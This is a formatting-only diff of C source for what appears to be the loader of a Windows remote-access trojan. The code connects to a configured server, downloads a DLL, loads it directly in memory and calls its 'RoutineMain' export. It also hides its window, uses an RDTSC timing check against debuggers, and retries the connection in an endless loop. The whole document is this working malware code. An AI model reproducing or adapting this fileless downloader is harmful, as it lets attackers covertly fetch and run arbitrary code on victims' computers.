@@ -15,26 +15,26 @@
 unsigned long _stdcall resolve(char *host)
 {
 	struct hostent *ser = NULL;
-	
+
 	long i = inet_addr(host);
-	
+
 	if (i < 0) //Not Ip
 	{
 		ser = (struct hostent*)gethostbyname(host);
-		
+
 		if (ser == NULL)
 		{
 			ser = (struct hostent*)gethostbyname(host); //retry
 		}
-		
+
 		if (ser != NULL)
 		{
 			return (*(unsigned long *)ser->h_addr);
 		}
-		
-		return 0;  
+
+		return 0;
 	}
-	
+
 	return i;
 }
 
@@ -65,14 +65,14 @@ struct MODIFY_DATA
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
 	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
-	
+
 	struct sockaddr_in LocalAddr;
 	LocalAddr.sin_family = AF_INET;
 	LocalAddr.sin_port = htons(modify_data.ServerPort);
 	LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
-	
+
 	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0); //Á¬½ÓµÄsocket
-	
+
 	int timeout = 45000;
 	int Err = setsockopt(MainSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
 
@@ -88,8 +88,8 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	{
 		TurnonKeepAlive(MainSocket, 120);
 	}
-	
-	MsgHead msgHead;	
+
+	MsgHead msgHead;
 	msgHead.dwCmd = SOCKET_DLLLOADER;
 	msgHead.dwSize = 0;
 
@@ -100,10 +100,10 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		return 1;
 	}
 
-	if(!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
+	if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
 	{
 		DbgErr("Can't Recv Dll Data Head");
-		
+
 		return 1;
 	}
 
@@ -112,30 +112,30 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	if (!RecvData(MainSocket, buf, msgHead.dwSize))
 	{
 		DbgErr("Can't Recv Dll Data");
-		
+
 		return 1;
 	}
-	
+
 	shutdown(MainSocket, 0x02);
 	closesocket(MainSocket);
 
 	if (msgHead.dwCmd == CMD_DLLDATA)
 	{
 		HMEMORYMODULE hModule;
-		
+
 		hModule = MemoryLoadLibrary(buf);
 		VirtualFree(buf, msgHead.dwSize);
 
 		if (hModule == NULL)
 		{
-			MsgErr(_T("Load Dll Err"));			
-			
+			MsgErr(_T("Load Dll Err"));
+
 			return 2;
 		}
 		else
 		{
-			typedef BOOL (*_RoutineMain)(LPVOID lp);
-			
+			typedef BOOL(*_RoutineMain)(LPVOID lp);
+
 			_RoutineMain  RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
 			Err = RoutineMain((LPVOID)&modify_data);
 			MemoryFreeLibrary(hModule);
@@ -151,31 +151,31 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance,
-					 HINSTANCE hPrevInstance,
-					 LPSTR     lpCmdLine,
-					 int       nCmdShow)
+	HINSTANCE hPrevInstance,
+	LPSTR     lpCmdLine,
+	int       nCmdShow)
 {
 	HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
-								L"#32770",
-								L"WindowsNet",
-								WS_OVERLAPPEDWINDOW,
-								0,
-								0,
-								100,
-								100,
-								HWND_DESKTOP,
-								NULL,
-								GetModuleHandleW(0),
-								NULL
-								);
-	
+		L"#32770",
+		L"WindowsNet",
+		WS_OVERLAPPEDWINDOW,
+		0,
+		0,
+		100,
+		100,
+		HWND_DESKTOP,
+		NULL,
+		GetModuleHandleW(0),
+		NULL
+		);
+
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
 
 	_asm
 	{
 		RDTSC
-			xchg    ecx, eax
+		xchg    ecx, eax
 			RDTSC
 			sub     eax, ecx
 			cmp     eax, 0FFh
@@ -188,16 +188,16 @@ OK:
 
 	GetInputState();
 	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
-	
+
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
-	
+
 	while (1)
 	{
 		__try
 		{
 			MsgErr("Exit before");
-			if ( ConnectThread(NULL) == -1)
+			if (ConnectThread(NULL) == -1)
 			{
 				MsgErr("Exit");
 				WSACleanup();
@@ -210,7 +210,7 @@ OK:
 			MsgErr("Except");
 		}
 	}
-	
+
 	WSACleanup();
 
 	return 0;
